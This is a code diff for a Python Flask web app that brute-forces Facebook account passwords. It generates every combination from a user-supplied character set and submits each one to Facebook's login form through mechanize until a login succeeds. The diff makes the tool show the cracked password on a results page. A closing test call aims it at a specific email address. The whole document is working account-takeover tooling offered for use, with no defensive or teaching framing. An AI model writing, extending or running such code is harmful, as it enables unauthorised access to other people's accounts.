@@ -1,7 +1,9 @@
 import mechanize
 from flask import Flask, render_template, request
 app = Flask(__name__)
-
+@app.errorhandler(500)
+def internal_service_error_bf(e):
+    return render_template('500_bf.html'), 500
 @app.route('/')
 def home():
     return render_template('index.html')
@@ -29,15 +31,22 @@ def brute_force_alg():
     charset = request.form['charset']
     website = request.form['website']
     for x in range(int(minpasswordlength),int(maxpasswordlength)+1):
-        print(generate(username,charset,x,""))
+        password = generate(username,charset,x,"")
         #print("username = "+username+"password = "+password)
         #if(facebook_form_filler(username, "gobuckeyes")):
-    return render_template('result.html', username = username, password = "gobuckeyes")
+    print("YOUR FOUND PASSWORD IS:    "+password)
+    if password is None:
+        return render_template('500_bf.html')
+    else:
+        return render_template('result.html', username = username, password = password)
     #return render_template('bruteforce.html')
 def generate(username, charset, length, word):
     if length==0:
         print(word)
-        if facebook_form_filler(username, word):
+        worked = facebook_form_filler(username, word)
+        print(username)
+        print(worked)
+        if worked:
             print("found it")
             return word
         else:
@@ -72,5 +81,4 @@ def facebook_form_filler(email, password):
     br.form['pass'] = password
     result = br.submit(id='u_0_2')
     return result.geturl() == "https://www.facebook.com/"
-
 print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
